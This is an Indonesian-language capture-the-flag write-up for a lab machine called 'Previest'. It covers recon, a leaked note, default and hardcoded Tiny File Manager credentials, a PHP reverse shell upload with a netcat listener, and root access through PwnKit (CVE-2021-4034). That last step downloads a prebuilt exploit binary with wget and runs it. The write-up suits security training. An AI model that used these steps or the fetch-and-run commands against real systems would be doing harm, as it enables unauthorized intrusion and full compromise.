
|**Target IP**|10.1.2.132|
|**OS**|Linux (Ubuntu 20.04.3 LTS)|
|**Difficulty**|Easy|
|**Hostname**|previest|

---

## 1. Ringkasan

Mesin **Previest** dapat dikompromikan melalui rangkaian celah berikut:

1. Endpoint tersembunyi `/Image2Text/` yang di-disallow di `robots.txt` mengekspos sebuah aplikasi PHP _Image-to-Text Converter_.
2. File catatan operator (`catatan.txt`) yang bocor mengungkap keberadaan instalasi **Tiny File Manager** ganda  satu yang sudah "di-_hardening_" di dalam aplikasi, dan satu lagi folder instalasi _default_ di web root yang lupa dihapus.
3. Instalasi Tiny File Manager di web root dapat diakses menggunakan kredensial _default_ (`user` / `12345`) dengan hak akses terbatas (_read-only_).
4. Akses baca tersebut cukup untuk membaca _source code_ `tinyfilemanager.php` milik instance yang sudah di-_hardening_, sehingga kredensial admin (`admin` / `Previ3st_slov`) dapat ditemukan hardcoded di dalamnya.
5. Kredensial admin dipakai untuk mengunggah _reverse shell_ PHP (Pentest Monkey) melalui fitur upload Tiny File Manager, menghasilkan akses awal sebagai `www-data`.
6. _Local Privilege Escalation_ dilakukan melalui kerentanan **CVE-2021-4034 (PwnKit)** pada `pkexec`, memberikan akses `root`.

---

## 2. Reconnaissance

### 2.1 Port Scanning

```bash
rustscan -a 10.1.2.132 --ulimit 1000 -r 1-65535 -- -A -sC -Pn
```

**Hasil:**

```
80/tcp open  http  syn-ack  Apache httpd 2.4.41 ((Ubuntu))
| http-methods:
|   Supported Methods: GET POST OPTIONS HEAD
|_http-title: Site doesn't have a title (text/html).
| http-robots.txt: 1 disallowed entry
|_/Image2Text/
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

Hanya port **80/tcp** yang terbuka, menjalankan Apache 2.4.41 di atas Ubuntu. Entri `robots.txt` mengarahkan langsung ke direktori `/Image2Text/`, yang menjadi titik awal enumerasi web.

---

## 3. Web Enumeration

### 3.1 `/Image2Text/`

Direktori ini berisi aplikasi PHP open-source **Image2Text Converter** (Image2Text`), sebuah tool yang mengubah gambar menjadi representasi karakter berwarna.

### 3.2 Directory & File Discovery

Fuzzing direktori (`feroxbuster`) pada `/Image2Text/` mengungkap beberapa file dan direktori penting:

```
http://10.1.2.132/Image2Text/images/catatan.txt
http://10.1.2.132/Image2Text/images/tinyfilemanager.php
http://10.1.2.132/Image2Text/images/
http://10.1.2.132/Image2Text/index.php
http://10.1.2.132/Image2Text/images/upload/            (folder upload publik)
```

### 3.3 Kebocoran Informasi — `catatan.txt`

File catatan operator ditemukan dapat diakses publik tanpa autentikasi:

```
GET /Image2Text/images/catatan.txt

TODO list :

1. Setting tinyfilemanager di sini [v]
2. hapus folder tinyfilemanager di folder /var/www/html karena filenya sudah ada disini
```

**Analisis clue:**

- Item 1 (`[v]`) menandakan Tiny File Manager **sudah** dikonfigurasi ulang di `/Image2Text/images/tinyfilemanager.php`.
- Item 2 **tidak** ditandai selesai  mengindikasikan folder instalasi Tiny File Manager _original_ di web root (`/var/www/html/tinyfilemanager/`) **masih ada** dan belum dibersihkan.

Clue ini menjadi kunci utama jalur eksploitasi selanjutnya.

### 3.4 Git Repository Exposure

Direktori `.git` juga ditemukan ter-_expose_ di `/Image2Text/.git/` dengan _directory listing_ aktif. Repository berhasil di-_dump_ menggunakan `git-dumper`:

```bash
git-dumper http://10.1.2.132/Image2Text/.git/ ./dumped-repo
```

Analisis riwayat commit (`git log --all -p`) mengonfirmasi bahwa repository hanya berisi _source code_ asli proyek open-source (tidak terdapat backdoor atau kredensial yang di-_commit_). File `index.php` yang diperoleh dari sini digunakan untuk menganalisis logika unggah gambar aplikasi.

---

## 4. Analisis Kerentanan Upload (`index.php`)

Fitur unggah gambar pada `/Image2Text/index.php` divalidasi menggunakan kombinasi:

```php
$allowedExts = array("gif", "jpeg", "jpg", "png");
$extension = end(explode(".", $_FILES["file"]["name"]));
if ((($_FILES["file"]["type"] == "image/gif") || ...) 
    && in_array($extension, $allowedExts))
```

Validasi ini sepenuhnya mengandalkan **Content-Type header** dan **nama file** yang dikirim klien  keduanya dapat dimanipulasi (_spoofable_). Namun, nama file hasil unggah di-_generate_ ulang secara acak oleh server:


```php
$imageUploaded = "images/upload/".$uniqueId.$filepostfix;
```

di mana `$filepostfix` selalu dipetakan ke salah satu dari empat ekstensi gambar berdasarkan Content-Type. Pengujian pengunggahan payload PHP dengan Content-Type `image/jpeg` mengonfirmasi bahwa:

- File berhasil diunggah dengan isi PHP mentah.
- Server **tidak** mengeksekusi file `.jpeg` sebagai PHP (dikonfirmasi lewat response header `Content-Type: image/jpeg` dan isi file ditampilkan sebagai teks, bukan dieksekusi).

**Kesimpulan:** vektor upload pada `index.php` merupakan _dead end_ untuk RCE langsung, dan tidak digunakan pada jalur eksploitasi final.

---

## 5. Exploitasi — Tiny File Manager Ganda

### 5.1 Menemukan Instalasi Original

Berdasarkan clue di `catatan.txt`, folder instalasi _default_ Tiny File Manager dicari di web root dan ditemukan aktif di:

```
http://10.1.2.132/tinyfilemanager/
```

Direktori berisi berkas instalasi standar proyek [tinyfilemanager.github.io](https://tinyfilemanager.github.io/), termasuk `Dockerfile`, `config-sample.php`, dan `tinyfilemanager.php`.

### 5.2 Login dengan Kredensial Default

Karena folder ini merupakan instalasi _default_ yang lupa dihapus/dihardening, login berhasil dilakukan menggunakan kredensial bawaan Tiny File Manager:

```
Username : user
Password : 12345
```

Kredensial ini memberikan hak akses **terbatas** (_read-only_) sesuai konfigurasi default aplikasi.

### 5.3 Membaca Source Code Instance Ter-hardening

Menggunakan akses baca dari instance _default_, dilakukan navigasi ke lokasi file `tinyfilemanager.php` milik instance yang sudah di-_hardening_ (`tinyfilemanager.php`). Karena hak akses bersifat _read_ pada level _filesystem_, isi _source code_ PHP dapat dibaca secara langsung tanpa dieksekusi oleh interpreter.

Di dalam _source code_ tersebut ditemukan kredensial admin yang di-_hardcode_:

```
Username : admin
Password : Previ3st_slov
```

### 5.4 Login Sebagai Admin

Kredensial admin digunakan untuk login ke instance Tiny File Manager yang di-_hardening_ (`tinyfilemanager.php`), memberikan hak akses penuh termasuk kemampuan **mengunggah dan mengeksekusi file PHP**.

---

## 6. Mendapatkan Akses Awal (Initial Access)

Dengan akses admin penuh pada Tiny File Manager, dilakukan pengunggahan _reverse shell_ PHP menggunakan template **Pentest Monkey PHP Reverse Shell**, dengan IP dan port disesuaikan ke mesin penyerang.

Setelah listener disiapkan (`nc -lvnp <port>`) dan berkas _reverse shell_ diakses melalui browser/`curl`, koneksi _shell_ diterima sebagai user:

```
www-data
```

### 6.1 Local Enumeration

Enumerasi lanjutan menggunakan **LinEnum / LSE (Linux Smart Enumeration)** dijalankan pada mesin target, menghasilkan temuan penting:

```
User        : www-data
Hostname    : previest
Distribution: Ubuntu 20.04.3 LTS
Kernel      : 5.11.0-34-generic
```

Beberapa kerentanan _privilege escalation_ dikonfirmasi oleh LSE:

|CVE|Deskripsi|Status|
|---|---|---|
|CVE-2021-4034|PwnKit — polkit `pkexec` privilege escalation|**Vulnerable** (polkit 0.105-26ubuntu1.1)|
|CVE-2022-0847|Dirty Pipe|**Vulnerable** (kernel 5.11.0-34-generic)|
|CVE-2023-22809|Sudoedit bypass|**Vulnerable** (sudo 1.8.31-1ubuntu1.2)|

### 6.2 Flag User

Flag _user_ diperoleh dari direktori _home_ pengguna `atikah`:

```
160fd0**
```

---

## 7. Privilege Escalation — CVE-2021-4034 (PwnKit)

### 7.1 Latar Belakang Kerentanan

`pkexec` adalah utilitas SUID-root milik PolicyKit (polkit), berfungsi serupa `sudo` untuk menjalankan perintah dengan hak akses lebih tinggi berdasarkan kebijakan sistem. Kerentanan ini telah ada sejak 2009 dan dipublikasikan pada Januari 2022.

**Akar masalah:** fungsi `main()` pada `pkexec` tidak memvalidasi kondisi `argc == 0`. Ketika proses dijalankan dengan array argumen kosong (`execve()` dengan `argv` kosong), pembacaan `argv[1]` yang seharusnya berisi nama _command_ justru "menyerempet" ke luar batas array dan membaca elemen pertama dari `envp[]` (_environment variable_) milik proses tersebut.

Kondisi ini dieksploitasi dengan menyisipkan _environment variable_ (`GCONV_PATH`) yang mengarah ke direktori yang dikendalikan penyerang, berisi _shared library_ (`.so`) berbahaya. Karena `pkexec` berjalan dengan hak **SUID root**, _shared library_ tersebut ikut dimuat dan dieksekusi dalam konteks root, menghasilkan _shell_ dengan privilese tertinggi.

### 7.2 Eksploitasi

```bash
wget https://github.com/ly4k/PwnKit/raw/main/PwnKit -O /tmp/PwnKit
chmod +x /tmp/PwnKit
/tmp/PwnKit
```

Eksekusi berhasil memberikan _shell_ interaktif dengan privilese **root**.

### 7.3 Flag Root

Flag _root_ diperoleh dari direktori `/root/`:

```
b95154c***
```